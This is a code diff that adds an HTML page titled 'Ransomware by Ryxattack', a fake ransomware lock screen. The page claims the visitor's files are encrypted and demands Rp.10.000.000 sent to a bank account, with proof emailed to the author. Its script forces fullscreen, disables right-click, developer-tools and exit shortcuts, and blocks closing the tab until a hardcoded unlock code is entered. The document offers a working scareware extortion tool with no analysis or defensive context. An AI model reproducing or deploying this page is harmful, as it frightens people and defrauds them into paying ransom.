@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+<title>Ransomware by Ryxattack</title>
+<style>
+    body {
+        background: #111;
+        color: #f00;
+        min-height: 100dvh;
+        margin: 0;
+        font-family: 'Fira Mono', 'Consolas', monospace;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 10px;
+    }
+    .container {
+        background: rgba(20,20,20,0.98);
+        box-shadow: 0 8px 32px 0 rgba(31,38,135,0.37);
+        border-radius: 18px;
+        padding: clamp(20px, 4vw, 40px);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        max-width: 420px;
+        width: 100%;
+        border: 2px solid #222;
+        animation: fadeIn 1.2s cubic-bezier(.68,-0.55,.27,1.55);
+    }
+    @keyframes fadeIn {
+        from { opacity: 0; transform: scale(0.95);}
+        to { opacity: 1; transform: scale(1);}
+    }
+    .lock-icon {
+        margin-bottom: 20px;
+        filter: drop-shadow(0 0 16px #f00a);
+        width: clamp(50px, 15vw, 80px);
+        height: auto;
+    }
+    h1 {
+        font-size: clamp(1.2em, 4vw, 2em);
+        margin-bottom: 16px;
+        color: #ff4444;
+        text-shadow: 0 2px 8px #f002;
+        text-align: center;
+    }
+    .desc {
+        font-size: clamp(0.9em, 2.5vw, 1.1em);
+        margin-bottom: 20px;
+        max-width: 400px;
+        text-align: center;
+        color: #fff;
+    }
+    .payment-box {
+        background: linear-gradient(120deg, #222 80%, #f002 100%);
+        padding: clamp(14px, 3vw, 20px);
+        border-radius: 10px;
+        margin-bottom: 20px;
+        width: 100%;
+        box-sizing: border-box;
+        border: 1.5px solid #0ff;
+        box-shadow: 0 0 16px #0ff3, 0 0 2px #f00a;
+    }
+    .payment-box strong {
+        color: #ff0;
+        font-size: 1.08em;
+    }
+    .btc-address {
+        background: #000;
+        color: #0f0;
+        font-family: monospace;
+        padding: 12px 10px;
+        border-radius: 6px;
+        margin: 14px 0;
+        font-size: 1em;
+        letter-spacing: 1px;
+        word-break: break-word;
+        border: 1px solid #0ff;
+        text-align: center;
+        user-select: all;
+    }
+    .payment-box hr {
+        border: 0;
+        border-top: 1px dashed #f00;
+        margin: 16px 0;
+    }
+    #unlock-form {
+        margin-top: 18px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        width: 100%;
+    }
+    #unlock-form label {
+        color: #fff;
+        margin-bottom: 8px;
+        font-size: 1em;
+    }
+    #unlock-code {
+        padding: 8px 12px;
+        border-radius: 4px;
+        border: none;
+        background: #333;
+        color: #0f0;
+        font-size: 1em;
+        margin-bottom: 12px;
+        outline: none;
+        box-shadow: 0 0 8px #0f0a;
+        width: 100%;
+        max-width: 220px;
+        text-align: center;
+    }
+    #unlock-form button {
+        padding: 8px 20px;
+        border: none;
+        border-radius: 4px;
+        background: linear-gradient(90deg, #f00, #0ff);
+        color: #fff;
+        font-weight: bold;
+        font-size: 1em;
+        cursor: pointer;
+        box-shadow: 0 0 10px #0ff, 0 0 20px #f00;
+        transition: background 0.2s, transform 0.2s;
+    }
+    #unlock-form button:hover {
+        background: linear-gradient(90deg, #0ff, #f00);
+        transform: scale(1.04);
+    }
+    #unlock-message {
+        margin-top: 10px;
+        color: #f00;
+        font-size: 0.95em;
+        display: none;
+        text-align: center;
+    }
+    .support {
+        font-size: clamp(0.85em, 2.5vw, 1em);
+        color: #fff;
+        margin-bottom: 10px;
+        text-align: center;
+    }
+    .support span {
+        color: #0ff;
+    }
+    .warn {
+        font-size: clamp(0.8em, 2vw, 0.93em);
+        color: #888;
+        text-align: center;
+    }
+</style>
+</head>
+<body>
+<div class="container" id="main-container">
+    <img src="https://img.icons8.com/ios-filled/100/ff0000/lock.png" alt="Lock Icon" class="lock-icon" />
+    <h1>Your Files Have Been Encrypted!</h1>
+    <p class="desc">
+        All your important files have been encrypted. To restore access, you must pay the ransom. Failure to do so will result in permanent loss of your data.
+    </p>
+    <br />
+    <div class="payment-box">
+        <strong>Payment Required:</strong><br />
+        <span style="color:#fff;">Send exactly <span style="color:#0ff; font-weight:bold;">Rp.10.000.000</span> to the BCA address below:</span>
+        <div class="btc-address">
+            6019 0050 7173 4888
+        </div>
+        <span style="color:#fff;">After payment, your files will be restored.<br />Do <span style="color:#f00;">NOT</span> close this window.</span>
+        <hr />
+        <form id="unlock-form">
+            <label for="unlock-code">Enter Unlock Code:</label>
+            <input type="password" id="unlock-code" name="unlock-code" autocomplete="off" />
+            <br />
+            <button type="submit">Unlock</button>
+            <span id="unlock-message">Invalid code. Try again.</span>
+        </form>
+    </div>
+    <p class="support">
+        After payment, send proof to <span><a href="mailto:ryxattack@gmail.com" style="text-decoration: none;">ryxattack@gmail.com</a></span>
+    </p>
+    <p class="warn">
+        Do not try to decrypt files yourself. Any attempt will result in data loss.
+    </p>
+</div>
+
+<script>
+(() => {
+    // ======= Proteksi & Fullscreen =======
+    let isUnlocked = false;
+
+    // Request fullscreen for mobile browsers
+    function requestFullscreen() {
+        const el = document.documentElement;
+        if (el.requestFullscreen) {
+            el.requestFullscreen();
+        } else if (el.webkitRequestFullscreen) {
+            el.webkitRequestFullscreen();
+        } else if (el.msRequestFullscreen) {
+            el.msRequestFullscreen();
+        }
+    }
+
+    // Exit fullscreen mode
+    function exitFullscreen() {
+        if (document.exitFullscreen) {
+            document.exitFullscreen();
+        } else if (document.webkitExitFullscreen) {
+            document.webkitExitFullscreen();
+        } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+        }
+    }
+
+    // Jalankan fullscreen saat load
+    window.onload = () => {
+        requestFullscreen();
+    };
+
+    // Disable klik kanan
+    document.addEventListener('contextmenu', e => e.preventDefault());
+
+    // Disable shortcut keluar / devtools
+    document.addEventListener('keydown', e => {
+        if (
+            !isUnlocked && (
+                e.key === "F12" ||
+                (e.ctrlKey && e.shiftKey && (e.key.toLowerCase() === "i" || e.key.toLowerCase() === "j")) ||
+                (e.ctrlKey && (e.key.toLowerCase() === "u" || e.key.toLowerCase() === "w" || e.key.toLowerCase() === "r")) ||
+                e.key === "Escape"
+            )
+        ) {
+            e.preventDefault();
+            e.stopPropagation();
+            alert("❌ This action is disabled until you unlock!");
+        }
+    });
+
+    // Cegah close tab
+    window.onbeforeunload = function() {
+        if (!isUnlocked) {
+            return "You cannot leave until you enter the unlock code!";
+        }
+    };
+
+    // Form Unlock
+    const form = document.getElementById('unlock-form');
+    const inputCode = document.getElementById('unlock-code');
+    const msg = document.getElementById('unlock-message');
+    const container = document.getElementById('main-container');
+
+    form.addEventListener('submit', e => {
+        e.preventDefault();
+        const code = inputCode.value.trim();
+        if (code === 'keyforyourdevice') {
+            isUnlocked = true;
+            window.onbeforeunload = null; // Remove unload protection
+            exitFullscreen();
+
+            // Tampilan keren setelah unlock
+            container.innerHTML = `
+                <div style="color:#0f0; font-size:2em; text-align:center; margin-top:20vh; font-family:monospace; animation: fadeInUnlock 1s ease forwards;">
+                     Unlocked! Your device is now safe and ready to use! <br />
+                    <span style="font-size:1.2em; color:#0ff;"></span>
+                </div>
+                <style>
+                    @keyframes fadeInUnlock {
+                        from {opacity: 0; transform: scale(0.9);}
+                        to {opacity: 1; transform: scale(1);}
+                    }
+                </style>
+            `;
+        } else {
+            msg.style.display = 'block';
+        }
+    });
+})();
+</script>
+
+</body>
+</html>
